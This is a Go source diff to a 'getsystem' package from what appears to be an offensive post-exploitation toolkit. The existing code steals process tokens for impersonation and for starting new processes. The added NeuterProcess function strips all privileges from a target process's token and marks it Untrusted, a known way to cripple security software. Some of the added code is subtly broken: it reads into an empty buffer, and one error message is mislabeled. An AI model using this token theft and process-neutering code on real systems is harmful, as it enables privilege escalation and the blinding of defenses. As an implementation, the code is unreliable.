@@ -1,6 +1,8 @@
 package getsystem
 
 import (
+	"bytes"
+	"encoding/binary"
 	"fmt"
 	"unsafe"
 
@@ -12,6 +14,7 @@ var (
 	advapi32                    = windows.NewLazySystemDLL("advapi32.dll")
 	procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
 	procCreateProcessWithTokenW = advapi32.NewProc("CreateProcessWithTokenW")
+	procSetTokenInformation     = advapi32.NewProc("SetTokenInformation")
 )
 
 const (
@@ -26,6 +29,7 @@ const (
 
 	sePrivilegeEnabled   = 0x00000002
 	flagCreateNewConsole = 0x00000010
+	MLUntrusted          = "S-1-16-0"
 )
 
 // OnThread will steal a token from the given process. It can be other users as well
@@ -35,24 +39,24 @@ const (
 func OnThread(pid int) error {
 	tokenH, err := tokenForPid(pid)
 	if err != nil {
-		return errors.Wrap(err, "token for pid failed")
+		return errors.Wrap(err, "token for PID failed")
 	}
 	defer tokenH.Close()
 
 	retCode, _, ntErr := procImpersonateLoggedOnUser.Call(uintptr(tokenH))
 	if retCode == 0 {
-		return errors.Wrap(ntErr, "could not impersonte token user")
+		return errors.Wrap(ntErr, "could not impersonate token user")
 	}
 	return nil
 }
 
-// InNewProcess will duplicate the token from given pid and start a new process
+// InNewProcess will duplicate the token from given PID and start a new process
 // using the winapi's DuplicateTokenEx and StartProccessWithTokenW with the given
 // command
 func InNewProcess(pid int, cmd string, hidden bool) error {
 	tokenH, err := tokenForPid(pid)
 	if err != nil {
-		return errors.Wrap(err, "token for pid failed")
+		return errors.Wrap(err, "token for PID failed")
 	}
 
 	var dupTokenH windows.Token
@@ -155,7 +159,7 @@ func TokenOwner(hToken windows.Token) (string, error) {
 func TokenOwnerFromPid(pid int) (string, error) {
 	hToken, err := tokenForPid(pid)
 	if err != nil {
-		return "", errors.Wrap(err, "failed to get token from pid")
+		return "", errors.Wrap(err, "failed to get token from PID")
 	}
 
 	return TokenOwner(hToken)
@@ -171,6 +175,137 @@ func tokenForPid(pid int) (tokenH windows.Token, err error) {
 	err = windows.OpenProcessToken(hProc, OpenProcTokenPerms, &tokenH)
 	if err != nil {
 		err = errors.Wrap(err, "failed to open token")
+	}
+	return
+}
+
+// NeuterProcess will remove set SE_PRIVILEGE_REMOVED on all privs for the process LUID.
+// It then sets the Token Label to Untrusted
+func NeuterProcess(pid int) (err error) {
+	tokenH, err := tokenForPid(pid)
+	if err != nil {
+		return
+	}
+
+	err = RemoveTokenPrivileges(tokenH)
+	if err != nil {
+		return
+	}
+
+	err = SetTokenLabel(tokenH, MLUntrusted)
+	return
+}
+
+type attrs struct {
+	tempLuid   int64
+	attributes int32
+}
+
+// RemoveTokenPrivileges fetches the privileges of a token and
+// revokes them by applying the SE_PRIVILEGE_REMOVED privilege
+func RemoveTokenPrivileges(tokenH windows.Token) (err error) {
+	tokenInformation, err := getTokenPrivileges(tokenH)
+	if err != nil {
+		return
+	}
+
+	privilegeCount := binary.LittleEndian.Uint32(tokenInformation[:4])
+	privileges := bytes.NewBuffer(tokenInformation[4:])
+	for i := uint32(0); i < privilegeCount; i++ {
+
+		info := attrs{}
+		err = binary.Read(privileges, binary.LittleEndian, &info)
+		if err != nil {
+			err = errors.Wrap(err, "failed to a patch a priv, continuing")
+			continue
+		}
+
+		var luid = windows.LUID{
+			LowPart:  uint32(info.tempLuid),
+			HighPart: 0,
+		}
+
+		newTokenPrivs := windows.Tokenprivileges{
+			PrivilegeCount: 1,
+			Privileges: [1]windows.LUIDAndAttributes{{
+				Luid:       luid,
+				Attributes: windows.SE_PRIVILEGE_REMOVED,
+			}},
+		}
+
+		err = windows.AdjustTokenPrivileges(tokenH, false, &newTokenPrivs, 0, nil, nil)
+		if err != nil {
+			err = errors.Wrap(err, "failed to a patch a priv, continuing")
+			continue
+		}
+
+	}
+	return
+}
+
+// SetTokenLabel sets a token label for a given token
+func SetTokenLabel(tokenH windows.Token, label string) (err error) {
+
+	var sid *windows.SID
+	utf16str, err := windows.UTF16PtrFromString(label)
+	if err != nil {
+		err = errors.Wrap(err, "failed to a convert label to utf16str")
+		return
+	}
+
+	err = windows.ConvertStringSidToSid(utf16str, &sid)
+	if err != nil {
+		err = errors.Wrap(err, "failed to convert  to SID")
+		return
+	}
+
+	tml := windows.Tokenmandatorylabel{Label: windows.SIDAndAttributes{
+		Sid:        sid,
+		Attributes: windows.SE_GROUP_INTEGRITY,
+	}}
+
+	_, err = setTokenMandatoryLabel(tokenH, windows.TokenIntegrityLevel, tml, tml.Size())
+	if err != nil {
+		err = errors.Wrap(err, "failed to setTokenMandatoryLabel")
+		return
+	}
+	return
+
+}
+
+func getTokenPrivileges(tokenH windows.Token) (tokenInfo []byte, err error) {
+	var tokenInfoSize uint32
+	windows.GetTokenInformation(tokenH, windows.TokenPrivileges, nil, 0, &tokenInfoSize)
+	err = windows.GetTokenInformation(
+		tokenH,
+		windows.TokenPrivileges,
+		&tokenInfo[0],
+		tokenInfoSize,
+		&tokenInfoSize,
+	)
+	if err != nil {
+		err = errors.Wrap(err, "failed to retrieve token information")
+		return
+	}
+	return
+}
+
+// github.com/tnpitsecurity/nerftoken-go/main.go#L24-L35
+func setTokenMandatoryLabel(
+	tokenH windows.Token,
+	tokenInformationClass uint32,
+	tml windows.Tokenmandatorylabel,
+	tmlLen uint32,
+) (result uintptr, err error) {
+	retCode, _, ntErr := procSetTokenInformation.Call(
+		uintptr(tokenH),
+		uintptr(tokenInformationClass),
+		uintptr(unsafe.Pointer(&tml)),
+		uintptr(tmlLen),
+	)
+	if retCode == 0 {
+		err = errors.Wrap(ntErr, "could not create process with token")
+		return
 	}
 	return
 }
